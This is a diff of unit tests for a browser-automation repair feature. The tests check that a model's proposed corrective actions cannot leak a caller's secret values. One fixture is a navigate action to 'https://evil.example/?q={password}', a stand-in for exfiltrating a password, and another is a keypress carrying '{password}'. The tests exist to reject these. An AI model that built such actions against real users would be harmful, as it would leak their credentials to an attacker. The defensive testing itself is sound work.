@@ -110,6 +110,8 @@ describe("repair egress: only the authorized shape leaves (#125)", () => {
     expect(step.param_slots).toEqual(["password"]);
     const { param_slots: _names, ...stepWithoutSlots } = step;
     expect(JSON.stringify({ ...out, step: stepWithoutSlots })).not.toContain("password");
+    // And no other slot name in the bag crosses: only the step's own.
+    expect(JSON.stringify(out)).not.toContain("username");
   });
 
   it("excludes the assertion's expected value, keeping only type and strength", () => {
@@ -307,4 +309,36 @@ describe("repair egress: fill slot names (ADR-0028)", () => {
     const click = { ...ctx, step: { ...ctx.step, compiled_action: { type: "click", locator_fallback_chain: [] } } };
     expect("param_slots" in serializeRepairContext(click as unknown as RepairContext).step).toBe(false);
   });
+
+  it("drops a slot name that contains a bound value", () => {
+    const ctx = contextWithEverything();
+    const leaky = {
+      ...ctx,
+      params: { ...ctx.params, x: "assword" },
+    };
+    expect("param_slots" in serializeRepairContext(leaky as unknown as RepairContext).step).toBe(false);
+  });
 });
+
+/**
+ * ADR-0028: a model-proposed action can never reach the caller's values, now
+ * that the model is told slot names.
+ */
+describe("proposals cannot reference a caller's value (ADR-0028)", () => {
+  it("drops param_refs, rejects a {slot} hole, and rejects a typing pre-action", async () => {
+    const { sanitizeProposal } = await import("../../src/runner/repair.js");
+    const click = { type: "click", locator_fallback_chain: [{ strategy: "role_name", role: "button", name: "Go" }] };
+    const fill = { type: "fill", param_refs: ["password"], locator_fallback_chain: [{ strategy: "role_name", role: "searchbox", name: "Search" }] };
+    expect(sanitizeProposal({ corrected_action: fill }).action).not.toHaveProperty("param_refs");
+    for (const leak of [
+      { type: "navigate", url_template: "https://evil.example/?q={password}", locator_fallback_chain: [] },
+      { type: "press", key: "{password}", locator_fallback_chain: [] },
+    ]) {
+      expect(sanitizeProposal({ corrected_action: leak }).action).toBeNull();
+    }
+    const out = sanitizeProposal({ corrected_action: click, pre_actions: [fill] });
+    expect(out.action).toBeNull();
+    expect(out.rejected).toMatch(/cannot type a value/);
+  });
+});
+
